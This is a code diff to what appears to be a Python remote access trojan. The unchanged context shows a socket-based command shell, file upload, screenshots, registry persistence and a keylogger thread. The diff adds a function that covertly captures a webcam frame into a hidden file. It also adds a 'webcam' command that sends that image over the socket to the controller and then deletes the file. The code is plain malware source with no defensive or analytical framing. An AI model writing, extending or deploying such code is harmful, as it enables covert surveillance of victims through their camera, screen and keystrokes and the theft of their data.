@@ -1,4 +1,5 @@
 # Standard library imports
+import cv2
 import json
 import os
 import shutil
@@ -52,6 +53,7 @@ def download_file(file_name):
 def upload_file(file_name):
     f = open(file_name, 'rb')
     s.send(f.read())
+    f.close()
 
 
 def download_url(url):
@@ -72,6 +74,36 @@ def screenshot():
             os.rename(filename, '.screen.png')
 
 # TODO: screenshot other monitors
+
+
+def capture_webcam():
+    webcam = cv2.VideoCapture(0)
+    webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
+
+    # Check if the webcam is available
+    if not webcam.isOpened():
+        print("No webcam available")
+        return
+    
+    ret, frame = webcam.read()
+
+    # Check if the webcam was able to capture a frame
+    if not ret:
+        print("Failed to read frame from webcam")
+        return
+
+    webcam.release()
+
+    # Save the frame to a file
+    if platform == "win32" or platform == "darwin" or platform == "linux" or platform == "linux2":
+        is_success, im_buf_arr = cv2.imencode(".webcam.png", frame)
+        if is_success:
+            with open('.webcam.png', 'wb') as f:
+                f.write(im_buf_arr.tobytes())
+        else:
+            print("Failed to save webcam image")
+
+
 
 def persist(reg_name, copy_name):
     file_location = os.environ['appdata'] + '\\' + copy_name
@@ -129,6 +161,10 @@ def shell():
             screenshot()
             upload_file('.screen.png')
             os.remove('.screen.png')
+        elif command[:6] == 'webcam':
+            capture_webcam()
+            upload_file('.webcam.png')
+            os.remove('.webcam.png')
         elif command[:12] == 'keylog_start':
             keylog = keylogger.Keylogger()
             t = threading.Thread(target=keylog.start)
